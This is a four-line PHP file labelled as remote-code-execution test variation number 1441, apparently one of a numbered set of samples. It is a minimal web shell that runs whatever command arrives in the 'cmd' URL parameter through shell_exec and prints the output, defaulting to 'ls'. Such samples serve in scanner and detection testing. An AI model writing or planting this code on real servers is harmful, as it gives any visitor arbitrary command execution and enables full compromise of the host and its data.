<?php
// RCE test variation #1441
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>